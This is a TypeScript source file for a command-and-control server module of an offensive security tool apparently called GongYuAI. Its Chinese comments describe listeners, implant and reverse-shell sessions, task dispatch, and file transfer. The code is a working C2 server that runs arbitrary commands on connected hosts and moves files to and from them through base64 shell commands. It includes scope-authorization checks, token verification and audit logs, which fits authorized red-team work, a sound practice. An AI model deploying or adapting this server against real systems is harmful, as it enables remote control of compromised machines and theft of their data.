import { createServer as createTcpServer, type Server, type Socket } from "node:net";
import { createServer as createTlsServer } from "node:tls";
import { appendFileSync, closeSync, existsSync, mkdirSync, openSync, readFileSync, readSync, statSync, writeFileSync, createWriteStream, type WriteStream } from "node:fs";
import { join } from "node:path";
import { createHash, randomUUID, timingSafeEqual } from "node:crypto";
import { authorizePeer, authorizeCommand, type AuthSnapshot } from "./scope.js";

/**
 * C2：监听器 / 会话 / 任务 / 文件通道。
 *
 * 设计参考 CyberStrikeAI 的 c2 模型（listener → session → task → file/event），
 * 但按 GongYuAI 的约束重写：
 * - 会话对端先过授权闸（`authorizePeer`），越界会话只记录、不派任务；
 * - 两种会话：`agent`（JSON 行协议，implant 主动 hello）与 `raw`（反弹 shell 的裸字节流）；
 * - 所有收发落盘（每会话 transcript + 事件 JSONL），任务状态可回查；
 * - 不隐藏 payload：`c2` 工具返回真实命令/字节数，报告可引用 transcript。
 */

export type C2ListenerKind = "tcp" | "tls";
export type C2ListenerStatus = "running" | "stopped" | "error";

export type C2ListenerMeta = {
  id: string;
  kind: C2ListenerKind;
  bindHost: string;
  bindPort: number;
  status: C2ListenerStatus;
  startedAt: string;
  /** PID of the slot process that owns this TCP listener. Projection uses it to ignore stale state. */
  ownerPid?: number;
  error?: string;
  tls?: { certPath: string; keyPath: string };
};

export type C2SessionStatus = "active" | "idle" | "closed" | "blocked";

export type C2SessionMeta = {
  id: string;
  listenerId: string;
  kind: "agent" | "raw";
  peer: string;
  peerPort: number;
  connectedAt: string;
  lastSeenAt: string;
  status: C2SessionStatus;
  allowed: boolean;
  reason: string;
  host?: string;
  user?: string;
  os?: string;
  arch?: string;
  pid?: number;
  token?: string;
  note: string;
  bytesIn: number;
  bytesOut: number;
};

export type C2TaskKind = "exec" | "write" | "read" | "sleep" | "kill";
export type C2TaskStatus = "queued" | "sent" | "running" | "success" | "failed" | "cancelled";

export type C2TaskMeta = {
  id: string;
  sessionId: string;
  kind: C2TaskKind;
  payload: string;
  status: C2TaskStatus;
  createdAt: string;
  sentAt: string | null;
  completedAt: string | null;
  result: string;
  error: string;
  bytesOut: number;
};

export type C2Event = {
  at: string;
  level: "info" | "warn" | "critical";
  category: "listener" | "session" | "task" | "file";
  sessionId?: string;
  taskId?: string;
  message: string;
  data?: Record<string, unknown>;
};

export type C2FileMeta = {
  sha256: string;
  size: number;
  sessionId: string;
  remotePath: string;
  direction: "upload" | "download";
  storedAt: string;
};

function shellQuote(value: string): string {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}

function extractBase64(text: string): string {
  const lines = text.split(/\r?\n/).map((line) => line.trim());
  const candidates = lines.filter((line) => line.length >= 16 && /^[A-Za-z0-9+/=]+$/.test(line));
  return candidates.sort((a, b) => b.length - a.length)[0] ?? "";
}

type LiveSession = {
  meta: C2SessionMeta;
  socket: Socket;
  stream: WriteStream;
  bufferPath: string;
  pending: Map<string, { resolve: (task: C2TaskMeta) => void; fail: (msg: string) => void; timer: NodeJS.Timeout }>;
  firstChunk: Buffer | null;
  decided: boolean;
  handshakeTimer: NodeJS.Timeout | null;
};

export type C2ListenOptions = {
  bindHost?: string;
  bindPort?: number;
  kind?: C2ListenerKind;
  tls?: { certPath: string; keyPath: string };
  handshakeMs?: number;
};

const MAX_TASKS = 500;

export class C2Manager {
  private servers = new Map<string, { server: Server; meta: C2ListenerMeta }>();
  private sessions = new Map<string, LiveSession>();
  private meta = new Map<string, C2SessionMeta>();
  private tasks: C2TaskMeta[] = [];
  private closed = false;

  constructor(
    private readonly opts: {
      baseDir: string;
      auth: AuthSnapshot;
      onEvent?: (event: C2Event) => void;
      handshakeMs?: number;
      /** 可选共享 token：agent 的 hello.token 必须匹配，否则直接断开。 */
      token?: string;
      /** 会话无收发超过该时长视为半开，由看门狗关闭（默认 120s）。 */
      sessionIdleMs?: number;
      /** 看门狗扫描间隔（默认 15s）。 */
      sweepMs?: number;
    },
  ) {
    mkdirSync(join(this.opts.baseDir, "sessions"), { recursive: true });
    mkdirSync(join(this.opts.baseDir, "tasks"), { recursive: true });
    this.loadState();
    const sweep = setInterval(() => this.sweep(), this.opts.sweepMs ?? 15_000);
    if (sweep.unref) sweep.unref();
    this.watchdog = sweep;
  }

  private readonly watchdog: NodeJS.Timeout;

  /** 重启后保留只读历史视图：listener 不自动重启，session/task 可回查。 */
  private loadState(): void {
    const path = join(this.opts.baseDir, "state.json");
    if (!existsSync(path)) return;
    try {
      const raw = JSON.parse(readFileSync(path, "utf8")) as {
        sessions?: C2SessionMeta[];
        tasks?: C2TaskMeta[];
      };
      for (const session of raw.sessions ?? []) {
        if (session?.id) this.meta.set(session.id, { ...session, status: session.status === "blocked" ? "blocked" : "closed" });
      }
      for (const task of raw.tasks ?? []) {
        if (task?.id) this.tasks.push(task);
      }
    } catch {
      /* 状态文件损坏不阻塞启动 */
    }
  }

  /** 半开连接看门狗：无收发超过阈值即关闭并让在途任务失败。 */
  private sweep(): void {
    const idleMs = this.opts.sessionIdleMs ?? 120_000;
    const now = Date.now();
    for (const [id, live] of [...this.sessions]) {
      if (now - Date.parse(live.meta.lastSeenAt) <= idleMs) continue;
      this.event({
        level: "warn",
        category: "session",
        sessionId: id,
        message: `看门狗：${Math.round((now - Date.parse(live.meta.lastSeenAt)) / 1000)}s 无收发，关闭半开会话`,
      });
      live.socket.destroy();
      this.finishSession(id, live, "watchdog idle timeout");
    }
  }

  private event(e: Omit<C2Event, "at">): void {
    const full: C2Event = { at: new Date().toISOString(), ...e };
    try {
      appendFileSync(join(this.opts.baseDir, "events.jsonl"), `${JSON.stringify(full)}\n`);
    } catch {
      /* 审计写失败不阻塞动作 */
    }
    this.opts.onEvent?.(full);
  }

  private persist(): void {
    try {
      writeFileSync(
        join(this.opts.baseDir, "state.json"),
        JSON.stringify(
          {
            listeners: this.listeners(),
            sessions: this.sessionList(),
            tasks: this.tasks.slice(-MAX_TASKS),
            updatedAt: new Date().toISOString(),
          },
          null,
          2,
        ),
        { mode: 0o600 },
      );
    } catch {
      /* ignore */
    }
  }

  async listen(options: C2ListenOptions = {}): Promise<C2ListenerMeta> {
    const kind: C2ListenerKind = options.kind ?? "tcp";
    const bindHost = options.bindHost ?? "127.0.0.1";
    const bindPort = options.bindPort ?? 0;
    if (kind === "tls" && !options.tls) throw new Error("tls listener 需要 certPath/keyPath");
    const id = `l-${Date.now().toString(36)}-${randomUUID().slice(0, 6)}`;
    const handler = (socket: Socket) => this.accept(id, socket, options.handshakeMs ?? this.opts.handshakeMs);
    const server =
      kind === "tls"
        ? createTlsServer(
            { cert: readFileSync(options.tls!.certPath), key: readFileSync(options.tls!.keyPath) },
            handler,
          )
        : createTcpServer(handler);
    const meta: C2ListenerMeta = {
      id, kind, bindHost, bindPort, status: "running", startedAt: new Date().toISOString(),
      ownerPid: process.pid,
      ...(options.tls ? { tls: options.tls } : {}),
    };
    await new Promise<void>((resolve, reject) => {
      server.once("error", reject);
      server.listen({ host: bindHost, port: bindPort }, () => {
        server.off("error", reject);
        resolve();
      });
    });
    const address = server.address();
    if (address && typeof address === "object") meta.bindPort = address.port;
    server.on("error", (err) => {
      meta.status = "error";
      meta.error = err.message;
      this.event({ level: "critical", category: "listener", message: `listener ${id} 出错：${err.message}` });
      this.persist();
    });
    this.servers.set(id, { server, meta });
    this.event({
      level: "info", category: "listener",
      message: `listener ${id} 启动于 ${meta.bindHost}:${meta.bindPort} (${kind})`,
      data: { listenerId: id, bindHost: meta.bindHost, bindPort: meta.bindPort },
    });
    this.persist();
    return meta;
  }

  listeners(): C2ListenerMeta[] {
    return [...this.servers.values()].map((s) => ({ ...s.meta }));
  }

  closeListener(id: string): boolean {
    const entry = this.servers.get(id);
    if (!entry) return false;
    entry.server.close();
    entry.meta.status = "stopped";
    this.servers.delete(id);
    for (const [sid, live] of this.sessions) {
      if (live.meta.listenerId === id) this.closeSession(sid, "listener closed");
    }
    this.event({ level: "info", category: "listener", message: `listener ${id} 已停止` });
    this.persist();
    return true;
  }

  private accept(listenerId: string, socket: Socket, handshakeMs = 1_500): void {
    if (this.closed) {
      socket.destroy();
      return;
    }
    const peer = (socket.remoteAddress ?? "unknown").replace(/^::ffff:/, "");
    const peerPort = socket.remotePort ?? 0;
    const id = `s-${Date.now().toString(36)}-${randomUUID().slice(0, 6)}`;
    const authz = authorizePeer(this.opts.auth, peer);
    const dir = join(this.opts.baseDir, "sessions");
    const bufferPath = join(dir, `${id}.log`);
    const stream = createWriteStream(bufferPath, { flags: "a" });
    const meta: C2SessionMeta = {
      id, listenerId, kind: "raw", peer, peerPort,
      connectedAt: new Date().toISOString(), lastSeenAt: new Date().toISOString(),
      status: authz.allowed ? "active" : "blocked",
      allowed: authz.allowed, reason: authz.reason, note: "",
      bytesIn: 0, bytesOut: 0,
    };
    const live: LiveSession = {
      meta, socket, stream, bufferPath, pending: new Map(), firstChunk: null, decided: false,
      handshakeTimer: null,
    };
    this.sessions.set(id, live);
    this.meta.set(id, meta);
    this.event({
      level: authz.allowed ? "info" : "warn",
      category: "session",
      sessionId: id,
      message: `入站连接 ${peer}:${peerPort} → ${authz.allowed ? "已记录" : "越界只记录"}（${authz.reason}）`,
      data: { peer, peerPort, listenerId, allowed: authz.allowed },
    });
    writeFileSync(join(dir, `${id}.meta.json`), JSON.stringify(meta, null, 2), { mode: 0o600 });

    const decide = (kind: "agent" | "raw") => {
      if (live.decided) return;
      live.decided = true;
      if (live.handshakeTimer) clearTimeout(live.handshakeTimer);
      meta.kind = kind;
      writeFileSync(join(dir, `${id}.meta.json`), JSON.stringify(meta, null, 2), { mode: 0o600 });
      if (kind === "agent") this.handleAgentData(live, live.firstChunk ?? Buffer.alloc(0));
      live.firstChunk = null;
    };
    live.handshakeTimer = setTimeout(() => decide("raw"), handshakeMs);
    if (live.handshakeTimer.unref) live.handshakeTimer.unref();

    socket.setNoDelay(true);
    socket.on("data", (chunk: Buffer) => {
      if (this.sessions.get(id) !== live) return;
      meta.lastSeenAt = new Date().toISOString();
      meta.bytesIn += chunk.length;
      if (!live.decided) {
        live.firstChunk = Buffer.concat([live.firstChunk ?? Buffer.alloc(0), chunk]);
        const text = live.firstChunk.toString("utf8");
        if (text.includes("\n")) {
          const firstLine = text.split("\n")[0] ?? "";
          let kind: "agent" | "raw" = "raw";
          try {
            const parsed = JSON.parse(firstLine.trim()) as { t?: string };
            if (parsed && typeof parsed === "object" && parsed.t === "hello") kind = "agent";
          } catch {
            kind = "raw";
          }
          decide(kind);
        } else if (live.firstChunk.length > 4096) {
          decide("raw");
        }
        return;
      }
      if (meta.kind === "agent") this.handleAgentData(live, chunk);
      else stream.write(chunk);
    });
    socket.on("error", (err) => {
      if (this.sessions.get(id) !== live) return;
      meta.status = "closed";
      meta.reason = `连接错误：${err.message}`;
      this.event({ level: "warn", category: "session", sessionId: id, message: `会话错误：${err.message}` });
      this.finishSession(id, live);
    });
    socket.on("close", () => {
      if (this.sessions.get(id) !== live) return;
      this.finishSession(id, live, "对端断开");
    });
  }

  private finishSession(id: string, live: LiveSession, reason = "closed"): void {
    live.meta.status = "closed";
    live.meta.lastSeenAt = new Date().toISOString();
    for (const [taskId, pending] of live.pending) {
      clearTimeout(pending.timer);
      pending.fail(`会话已关闭（${reason}）`);
      const task = this.tasks.find((t) => t.id === taskId);
      if (task) {
        task.status = "failed";
        task.error = `会话已关闭（${reason}）`;
        task.completedAt = new Date().toISOString();
      }
    }
    live.pending.clear();
    live.stream.end();
    this.sessions.delete(id);
    this.meta.set(id, live.meta);
    writeFileSync(join(this.opts.baseDir, "sessions", `${id}.meta.json`), JSON.stringify(live.meta, null, 2), { mode: 0o600 });
    this.event({ level: "info", category: "session", sessionId: id, message: `会话关闭：${reason}` });
    this.persist();
  }

  private handleAgentData(live: LiveSession, chunk: Buffer): void {
    const text = chunk.toString("utf8");
    live.stream.write(chunk);
    for (const line of text.split("\n")) {
      const trimmed = line.trim();
      if (!trimmed) continue;
      let msg: Record<string, unknown>;
      try {
        msg = JSON.parse(trimmed) as Record<string, unknown>;
      } catch {
        continue;
      }
      const t = String(msg.t ?? "");
      if (t === "hello") {
        if (this.opts.token) {
          const got = Buffer.from(String(msg.token ?? ""));
          const want = Buffer.from(this.opts.token);
          if (got.length !== want.length || !timingSafeEqual(got, want)) {
            this.event({ level: "critical", category: "session", sessionId: live.meta.id, message: "agent token 不匹配，连接已断开" });
            live.socket.destroy();
            return;
          }
        }
        live.meta.kind = "agent";
        live.meta.host = typeof msg.host === "string" ? msg.host.slice(0, 120) : undefined;
        live.meta.user = typeof msg.user === "string" ? msg.user.slice(0, 120) : undefined;
        live.meta.os = typeof msg.os === "string" ? msg.os.slice(0, 60) : undefined;
        live.meta.arch = typeof msg.arch === "string" ? msg.arch.slice(0, 40) : undefined;
        live.meta.pid = typeof msg.pid === "number" ? msg.pid : undefined;
        live.meta.token = typeof msg.token === "string" ? msg.token.slice(0, 120) : undefined;
        const welcome = JSON.stringify({ t: "welcome", sessionId: live.meta.id, sleep: 0 });
        live.socket.write(`${welcome}\n`);
        live.meta.bytesOut += Buffer.byteLength(welcome) + 1;
        this.event({ level: "info", category: "session", sessionId: live.meta.id, message: `agent 上线：${live.meta.user ?? "?"}@${live.meta.host ?? live.meta.peer}` });
        writeFileSync(join(this.opts.baseDir, "sessions", `${live.meta.id}.meta.json`), JSON.stringify(live.meta, null, 2), { mode: 0o600 });
        continue;
      }
      if (t === "result") {
        const taskId = String(msg.id ?? "");
        const pending = live.pending.get(taskId);
        const task = this.tasks.find((item) => item.id === taskId);
        if (task) {
          task.status = msg.ok === false ? "failed" : "success";
          task.result = typeof msg.stdout === "string" ? msg.stdout : typeof msg.output === "string" ? msg.output : "";
          const stderr = typeof msg.stderr === "string" ? msg.stderr : "";
          if (stderr) task.result += `${task.result ? "\n" : ""}[stderr]\n${stderr}`;
          task.completedAt = new Date().toISOString();
          if (msg.ok === false) task.error = String(msg.error ?? stderr ?? "implant 报错");
        }
        if (pending) {
          clearTimeout(pending.timer);
          live.pending.delete(taskId);
          if (task) pending.resolve(task);
          else pending.fail("任务记录缺失");
        }
        this.event({ level: task?.status === "failed" ? "warn" : "info", category: "task", sessionId: live.meta.id, taskId, message: `任务 ${taskId} ${task?.status ?? "结果"}` });
        this.persist();
        continue;
      }
      if (t === "ping") {
        const pong = JSON.stringify({ t: "pong", at: new Date().toISOString() });
        live.socket.write(`${pong}\n`);
        live.meta.bytesOut += Buffer.byteLength(pong) + 1;
      }
    }
  }

  sessionList(): C2SessionMeta[] {
    const merged = new Map<string, C2SessionMeta>();
    const staleMs = 60_000;
    const now = Date.now();
    for (const [id, meta] of this.meta) merged.set(id, { ...meta });
    for (const [id, live] of this.sessions) {
      const copy = { ...live.meta };
      // active 但长时间无收发且没有在途任务 → idle（不改写底层状态，读时投影）。
      if (copy.status === "active" && live.pending.size === 0 && now - Date.parse(copy.lastSeenAt) > staleMs) {
        copy.status = "idle";
      }
      merged.set(id, copy);
    }
    return [...merged.values()].sort((a, b) => b.connectedAt.localeCompare(a.connectedAt));
  }

  get sessionUnsafe(): Map<string, LiveSession> {
    return this.sessions;
  }

  session(id: string): C2SessionMeta | null {
    const live = this.sessions.get(id);
    if (live) return { ...live.meta };
    const meta = this.meta.get(id);
    return meta ? { ...meta } : null;
  }

  private requireLive(sessionId: string): LiveSession {
    const live = this.sessions.get(sessionId);
    if (!live) throw new Error(`会话不存在或已断开：${sessionId}`);
    if (!live.meta.allowed) throw new Error(`会话越界，禁止派任务：${live.meta.reason}`);
    if (live.meta.status === "blocked") throw new Error(`会话越界，禁止派任务：${live.meta.reason}`);
    return live;
  }

  /** 范围内命令校验：C2 的 exec 与本地 shell 同一套闸。 */
  private guard(sessionId: string, command: string): void {
    const live = this.requireLive(sessionId);
    const verdict = authorizeCommand(this.opts.auth, command, { extraHosts: [live.meta.peer] });
    if (!verdict.allowed) throw new Error(`C2 任务被拒绝：${verdict.reason}`);
  }

  async task(
    sessionId: string,
    input: {
      kind: C2TaskKind;
      command?: string;
      data?: string;
      waitMs?: number;
      marker?: string;
      idleMs?: number;
    },
  ): Promise<C2TaskMeta> {
    const live = this.requireLive(sessionId);
    const kind = input.kind;
    const payload = kind === "exec" ? input.command ?? "" : input.data ?? input.command ?? "";
    const task: C2TaskMeta = {
      id: `t-${Date.now().toString(36)}-${randomUUID().slice(0, 6)}`,
      sessionId, kind, payload, status: "queued",
      createdAt: new Date().toISOString(), sentAt: null, completedAt: null,
      result: "", error: "", bytesOut: 0,
    };
    this.tasks.push(task);
    if (this.tasks.length > MAX_TASKS) this.tasks = this.tasks.slice(-MAX_TASKS);
    if (kind === "exec") {
      try {
        this.guard(sessionId, payload);
      } catch (err) {
        const message = err instanceof Error ? err.message : String(err);
        task.status = "failed";
        task.error = message;
        task.completedAt = new Date().toISOString();
        this.event({ level: "warn", category: "task", sessionId, taskId: task.id, message: `任务被拒：${message}` });
        this.persist();
        throw err;
      }
    }

    if (kind === "kill") {
      task.status = "sent";
      task.sentAt = new Date().toISOString();
      if (live.meta.kind === "agent") {
        const frame = `${JSON.stringify({ t: "task", id: task.id, kind: "kill" })}\n`;
        live.socket.write(frame);
        live.meta.bytesOut += Buffer.byteLength(frame);
      }
      setTimeout(() => live.socket.destroy(), 200).unref?.();
      task.status = "success";
      task.completedAt = new Date().toISOString();
      this.event({ level: "warn", category: "task", sessionId, taskId: task.id, message: "结束会话" });
      this.persist();
      return Promise.resolve(task);
    }

    if (kind === "sleep") {
      const seconds = Number(input.data ?? "0") || 0;
      task.status = "sent";
      task.sentAt = new Date().toISOString();
      if (live.meta.kind === "agent") {
        const frame = `${JSON.stringify({ t: "task", id: task.id, kind: "sleep", seconds })}\n`;
        live.socket.write(frame);
        live.meta.bytesOut += Buffer.byteLength(frame);
        task.status = "success";
        task.completedAt = new Date().toISOString();
      } else {
        task.status = "failed";
        task.error = "raw 会话不支持 sleep 指令";
      }
      this.persist();
      return Promise.resolve(task);
    }

    if (live.meta.kind === "agent") {
      return new Promise<C2TaskMeta>((resolve) => {
        const timer = setTimeout(() => {
          live.pending.delete(task.id);
          task.status = "failed";
          task.error = `implant 在 ${input.waitMs ?? 30_000}ms 内未回结果`;
          task.completedAt = new Date().toISOString();
          this.event({ level: "warn", category: "task", sessionId, taskId: task.id, message: task.error });
          this.persist();
          resolve(task);
        }, input.waitMs ?? 30_000);
        if (timer.unref) timer.unref();
        live.pending.set(task.id, { resolve, fail: (msg) => { task.status = "failed"; task.error = msg; resolve(task); }, timer });
        const frame = `${JSON.stringify({ t: "task", id: task.id, kind: "exec", command: payload })}\n`;
        live.socket.write(frame);
        live.meta.bytesOut += Buffer.byteLength(frame);
        task.status = "running";
        task.sentAt = new Date().toISOString();
        task.bytesOut += Buffer.byteLength(frame);
        this.event({ level: "info", category: "task", sessionId, taskId: task.id, message: `下发 exec：${payload.slice(0, 120)}` });
        this.persist();
      });
    }

    // raw 会话：写命令 + 可选结束标记，按"输出空闲"收口。
    const before = this.read(sessionId, 0, 1);
    const marker = input.marker ?? `__GY_DONE_${task.id}__`;
    const line = kind === "exec" ? `${payload}\necho ${marker}\n` : payload;
    live.socket.write(line);
    live.meta.bytesOut += Buffer.byteLength(line);
    task.status = "running";
    task.sentAt = new Date().toISOString();
    task.bytesOut += Buffer.byteLength(line);
    const start = before.size;
    const waitMs = input.waitMs ?? 15_000;
    const idleMs = input.idleMs ?? 600;
    return this.collectRaw(live, task, start, marker, waitMs, idleMs);
  }

  private collectRaw(
    live: LiveSession,
    task: C2TaskMeta,
    start: number,
    marker: string,
    waitMs: number,
    idleMs: number,
  ): Promise<C2TaskMeta> {
    const deadline = Date.now() + waitMs;
    let lastSize = start;
    let lastChange = Date.now();
    return new Promise((resolve) => {
      const tick = () => {
        if (this.sessions.get(live.meta.id) !== live) {
          task.status = "failed";
          task.error = "会话已断开";
          task.completedAt = new Date().toISOString();
          resolve(task);
          return;
        }
        const chunk = this.read(live.meta.id, start, Number.MAX_SAFE_INTEGER);
        if (chunk.size !== lastSize) {
          lastSize = chunk.size;
          lastChange = Date.now();
        }
        const text = chunk.data;
        const hit = text.indexOf(marker) >= 0;
        const timedOut = Date.now() > deadline;
        const idle = text.length > 0 && Date.now() - lastChange >= idleMs;
        // 收口语义：命中标记 = 成功；输出持续且已空闲 = 成功（交互 shell 无标记）；
        // 到达等待上限仍无收口 = 失败，不能把超时记成成功。
        if (hit || (!timedOut && idle)) {
          task.status = "success";
          task.result = text.replace(marker, "").trimEnd();
          task.completedAt = new Date().toISOString();
          this.event({ level: "info", category: "task", sessionId: live.meta.id, taskId: task.id, message: `raw 任务收口（${hit ? "标记命中" : "空闲收口"}）` });
          this.persist();
          resolve(task);
          return;
        }
        if (timedOut) {
          task.status = "failed";
          task.error = "等待输出超时";
          task.result = text;
          task.completedAt = new Date().toISOString();
          this.event({ level: "warn", category: "task", sessionId: live.meta.id, taskId: task.id, message: "raw 任务超时" });
          this.persist();
          resolve(task);
          return;
        }
        setTimeout(tick, 150).unref?.();
      };
      tick();
    });
  }

  readRaw(sessionId: string): { data: string; size: number } {
    const chunks = this.read(sessionId, 0, Number.MAX_SAFE_INTEGER);
    return { data: chunks.data, size: chunks.size };
  }

  read(sessionId: string, offset = 0, maxBytes = 64 * 1024): { data: string; offset: number; nextOffset: number; size: number } {
    const path = join(this.opts.baseDir, "sessions", `${sessionId}.log`);
    if (!existsSync(path)) return { data: "", offset, nextOffset: offset, size: 0 };
    const size = statSync(path).size;
    const start = Math.max(0, Math.min(offset, size));
    const length = Math.max(0, Math.min(size - start, maxBytes));
    if (!length) return { data: "", offset: start, nextOffset: start, size };
    const fd = openSync(path, "r");
    try {
      const buf = Buffer.alloc(length);
      const read = readSync(fd, buf, 0, length, start);
      return { data: buf.subarray(0, read).toString("utf8"), offset: start, nextOffset: start + read, size };
    } finally {
      closeSync(fd);
    }
  }

  write(sessionId: string, data: string): { ok: boolean; bytes: number } {
    const live = this.requireLive(sessionId);
    live.socket.write(data);
    live.meta.bytesOut += Buffer.byteLength(data);
    return { ok: true, bytes: Buffer.byteLength(data) };
  }

  setNote(sessionId: string, note: string): C2SessionMeta | null {
    const live = this.sessions.get(sessionId);
    const meta = live?.meta ?? this.meta.get(sessionId);
    if (!meta) return null;
    meta.note = note.slice(0, 500);
    writeFileSync(join(this.opts.baseDir, "sessions", `${sessionId}.meta.json`), JSON.stringify(meta, null, 2), { mode: 0o600 });
    this.persist();
    return { ...meta };
  }

  closeSession(sessionId: string, reason = "operator closed"): boolean {
    const live = this.sessions.get(sessionId);
    if (!live) return false;
    live.socket.destroy();
    this.finishSession(sessionId, live, reason);
    return true;
  }

  /** 内容寻址落盘：<baseDir>/files/<sha256>.bin + .json 元数据。 */
  saveBlob(sessionId: string, remotePath: string, direction: "upload" | "download", content: Buffer): C2FileMeta {
    const sha256 = createHash("sha256").update(content).digest("hex");
    const dir = join(this.opts.baseDir, "files");
    mkdirSync(dir, { recursive: true });
    const bin = join(dir, `${sha256}.bin`);
    if (!existsSync(bin)) writeFileSync(bin, content, { mode: 0o600 });
    const meta: C2FileMeta = {
      sha256, size: content.length, sessionId, remotePath, direction, storedAt: new Date().toISOString(),
    };
    writeFileSync(join(dir, `${sha256}.json`), JSON.stringify(meta, null, 2), { mode: 0o600 });
    this.event({ level: "info", category: "file", sessionId, message: `${direction} ${remotePath} ${content.length}B sha256=${sha256.slice(0, 16)}…` });
    this.persist();
    return meta;
  }

  readBlob(sha256: string, offset = 0, maxBytes = 64 * 1024): { data: string; offset: number; nextOffset: number; size: number; sha256: string } {
    const path = join(this.opts.baseDir, "files", `${sha256}.bin`);
    if (!existsSync(path)) throw new Error(`blob 不存在：${sha256}`);
    const size = statSync(path).size;
    const start = Math.max(0, Math.min(offset, size));
    const length = Math.max(0, Math.min(size - start, Math.min(maxBytes, 1024 * 1024)));
    const fd = openSync(path, "r");
    try {
      const buf = Buffer.alloc(length);
      const read = readSync(fd, buf, 0, length, start);
      return { data: buf.subarray(0, read).toString("base64"), offset: start, nextOffset: start + read, size, sha256 };
    } finally {
      closeSync(fd);
    }
  }

  /**
   * 上传：按 2KB 分块走 base64，避免单行超过远端 shell 的输入缓冲。
   * 远端不需要额外通道——用目标机自带的 base64 解码即可，失败会以任务 failed 暴露。
   */
  async putFile(sessionId: string, remotePath: string, content: Buffer): Promise<{ file: C2FileMeta; tasks: C2TaskMeta[] }> {
    const tasks: C2TaskMeta[] = [];
    const chunks: Buffer[] = [];
    for (let i = 0; i < content.length; i += 2048) chunks.push(content.subarray(i, i + 2048));
    if (!chunks.length) chunks.push(Buffer.alloc(0));
    for (const [index, chunk] of chunks.entries()) {
      const b64 = chunk.toString("base64");
      const redirect = index === 0 ? ">" : ">>";
      const task = await this.task(sessionId, {
        kind: "exec",
        command: `printf %s ${shellQuote(b64)} | base64 -d ${redirect} ${shellQuote(remotePath)}`,
        waitMs: 15_000,
        marker: `__GY_UP_${index}__`,
      });
      tasks.push(task);
      if (task.status !== "success") return { file: this.saveBlob(sessionId, remotePath, "upload", content), tasks };
    }
    return { file: this.saveBlob(sessionId, remotePath, "upload", content), tasks };
  }

  /** 下载：远端 `base64 < path`，服务端解码并按 sha256 落盘。 */
  async getFile(sessionId: string, remotePath: string, opts: { waitMs?: number; maxBytes?: number } = {}): Promise<{ file: C2FileMeta; task: C2TaskMeta; content: Buffer }> {
    const task = await this.task(sessionId, {
      kind: "exec",
      command: `base64 < ${shellQuote(remotePath)} | tr -d '\\n'`,
      waitMs: opts.waitMs ?? 30_000,
      marker: "__GY_DL__",
    });
    const content = Buffer.from(extractBase64(task.result), "base64");
    return { file: this.saveBlob(sessionId, remotePath, "download", content), task, content };
  }

  taskList(sessionId?: string): C2TaskMeta[] {
    return this.tasks.filter((t) => !sessionId || t.sessionId === sessionId).slice(-100).reverse();
  }

  close(): void {
    this.closed = true;
    clearInterval(this.watchdog);
    for (const id of [...this.servers.keys()]) this.closeListener(id);
    for (const id of [...this.sessions.keys()]) this.closeSession(id, "manager closed");
    this.persist();
  }
}
